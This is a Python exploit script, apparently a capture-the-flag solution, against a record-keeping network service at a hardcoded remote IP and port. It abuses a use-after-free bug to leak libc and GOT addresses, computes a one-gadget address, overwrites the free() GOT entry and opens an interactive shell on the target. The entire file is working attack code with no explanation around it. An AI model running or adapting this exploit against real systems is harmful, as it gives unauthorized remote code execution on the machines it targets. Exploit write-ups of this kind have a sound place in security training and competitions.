import sys, socket, struct, telnetlib

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a): 
    return struct.pack("<Q",a)

def u(a):
    return struct.unpack("<Q",a)[0]

def create_record(name,kind,age):
    read_until(f, ">")
    f.write("1\n")
    read_until(f, ">")
    f.write(name+"\n")
    read_until(f, ">")
    f.write(kind+"\n")
    read_until(f, ">")
    f.write(age+"\n")

def edit_record(id,name,kind,age,yn):
    read_until(f, ">")
    f.write("2\n")
    read_until(f, ">")
    f.write(id+"\n")
    read_until(f, ">")
    f.write(name+"\n")
    read_until(f, ">")
    f.write(kind+"\n")
    read_until(f, ">")
    f.write(age+"\n")
    read_until(f, "(y)/n>")
    f.write(yn+"\n")

def print_record(id):
    read_until(f, ">")
    f.write("3\n")
    read_until(f, ">")
    f.write(id+"\n")

def main():
    libc_start_got = 0x000000602050
    free_got = 0x000000602018
    addr_6020b0 = 0x6020b0

    # Create fake record to leak address with use after free bug
    create_record("AAAA","EEEE","1")
    edit_record("0","AAAA","CCCC","1","n")
    create_record("AAAA",p(addr_6020b0)+p(addr_6020b0+16),"1")
    edit_record("0",p(addr_6020b0+8)+p(libc_start_got),p(free_got),"1","y")
    print_record("2")

    # Calculate one gadget rce address 
    read_until(f, "name: ")
    libc_start = u(f.read(6)+"\x00"*2)
    libc_base = libc_start - libc_start_offset
    one_rce = libc_base + one_rce_offset
    read_until(f, "kind: ")
    free = u(f.read(6)+"\x00"*2)
    print "libc_start: %s" % hex(libc_start)
    print "free: %s" % hex(free)
    print "one_rce: %s" % hex(one_rce)

    # GOT Overwrite
    create_record("AAAA","EEEE","1")
    edit_record("0","AAAA","CCCC","1","n")
    create_record("AAAA",p(free_got),"1")
    edit_record("0",p(one_rce),p(one_rce),"1","y")

    shell(s)          

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("178.62.40.102", 6000)
        libc_start_offset = 0x0000000000020740
        #one_rce_offset = 0x4526a
        one_rce_offset = 0xf02a4
        #one_rce_offset = 0xf1147
        main()
    else:
        s, f = sock("localhost", 6000)
        libc_start_offset = 0x0000000000021e50
        #one_rce_offset = 0x4647c
        one_rce_offset = 0xe93e5
        #one_rce_offset = 0xea33d
        main()
